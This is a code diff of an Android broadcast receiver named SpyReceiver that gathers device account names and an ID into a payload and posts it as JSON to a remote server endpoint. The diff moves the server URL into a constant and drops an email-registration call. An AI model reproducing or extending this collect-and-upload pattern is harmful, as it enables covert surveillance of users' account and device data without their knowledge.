@@ -4,18 +4,15 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.os.Handler;
 import android.provider.Settings;
 import android.util.Log;
 
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
-import com.google.gson.JsonObject;
-import com.google.gson.JsonParser;
 import com.loopj.android.http.AsyncHttpClient;
-import com.loopj.android.http.AsyncHttpResponseHandler;
-import com.loopj.android.http.RequestParams;
-import com.loopj.android.http.TextHttpResponseHandler;
 
+import co.poweramp.crackapp.Constants;
 import co.poweramp.crackapp.R;
 import cz.msebera.android.httpclient.Header;
 import cz.msebera.android.httpclient.entity.StringEntity;
@@ -27,7 +24,7 @@ import cz.msebera.android.httpclient.entity.StringEntity;
  * Copyright (c) 2015 Duncan Leo. All Rights Reserved.
  */
 public class SpyReceiver extends BroadcastReceiver {
-    private final String TAG = "SpyReceiver", BASE_URL = "http://192.168.1.104:8080"; //TODO: FIx BASE URL
+    private final String TAG = "SpyReceiver"; //TODO: FIx BASE URL
     private AsyncHttpClient httpClient;
 
     @Override
@@ -35,23 +32,23 @@ public class SpyReceiver extends BroadcastReceiver {
         if (httpClient == null) {
             httpClient = new AsyncHttpClient();
         }
+        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_account_id), Context.MODE_PRIVATE);
+        final int accountId = sharedPref.getInt("accountId", -1);
+        if (accountId == -1) {
+            Log.d(TAG, "Account id is -1, ignored!");
+            return;
+        }
+        final Handler handler = new Handler();
         new Job(context, new Job.JobListener() {
             @Override
             public void onComplete(final Payload p) {
-                final SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_account_id), Context.MODE_PRIVATE);
-                int accountId = sharedPref.getInt("accountId", -1);
-                if (accountId == -1) {
-                    requestForAccountId(context, p.getAccounts()[0].name, new RequestAccountListener() {
-                        @Override
-                        public void onSuccess(int accountId) {
-                            p.setAccountId(accountId);
-                            submitPayload(context, p);
-                        }
-                    });
-                } else {
-                    p.setAccountId(accountId);
-                    submitPayload(context, p);
-                }
+                handler.post(new Runnable() {
+                    @Override
+                    public void run() {
+                        p.setAccountId(accountId);
+                        submitPayload(context, p);
+                    }
+                });
             }
         });
     }
@@ -71,58 +68,25 @@ public class SpyReceiver extends BroadcastReceiver {
             e.printStackTrace();
             return;
         }
-        System.out.println(json);
-        httpClient.post(context, BASE_URL + "/records/add", entity, "application/json", new SaneAsyncHttpResponseHandler() {
+        Log.d(TAG, "Sending JSON: " + json);
+        httpClient.post(context, Constants.BASE_URL + "/records/add", entity, "application/json", new SaneAsyncHttpResponseHandler() {
             @Override
             public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                 Log.d(TAG, "Sent payload to server successfully.");
-
+                String resp = new String(responseBody);
+                Log.d(TAG, "Server response: " + resp);
             }
 
             @Override
             public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                 Log.d(TAG, "Failed to send payload to server: " + statusCode);
+                String resp = new String(responseBody);
+                Log.d(TAG, "Server response: " + resp);
             }
         });
     }
 
-    private interface RequestAccountListener {
-        void onSuccess(int accountId);
-    }
 
-    /**
-     * Request for an account id from the server
-     * @param context
-     * @param email
-     */
-    private void requestForAccountId(final Context context, String email, final RequestAccountListener listener) {
-        RequestParams params = new RequestParams();
-        params.put("email", email);
-        httpClient.post(context, BASE_URL + "/users/add", params, new SaneAsyncHttpResponseHandler() {
-            @Override
-            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                String response = new String(responseBody);
-                JsonObject obj = new JsonParser().parse(response).getAsJsonObject();
-                boolean success = obj.get("success").getAsBoolean();
-                if (success) {
-                    SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_account_id), Context.MODE_PRIVATE);
-                    SharedPreferences.Editor editor = sharedPref.edit();
-                    int accountId = obj.get("data").getAsJsonObject().get("account_id").getAsJsonObject().get("id").getAsInt();
-                    editor.putInt(context.getString(R.string.preference_account_id), accountId);
-                    editor.commit();
-                    Log.d(TAG, "Got account id: " + accountId);
-                    listener.onSuccess(accountId);
-                } else {
-                    Log.d(TAG, "Success is false from server: " + response);
-                }
-            }
-
-            @Override
-            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                Log.d(TAG, "POST to server failed: " + statusCode);
-            }
-        });
-    }
 
     private String getUniqueDeviceId(final Context context) {
         return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
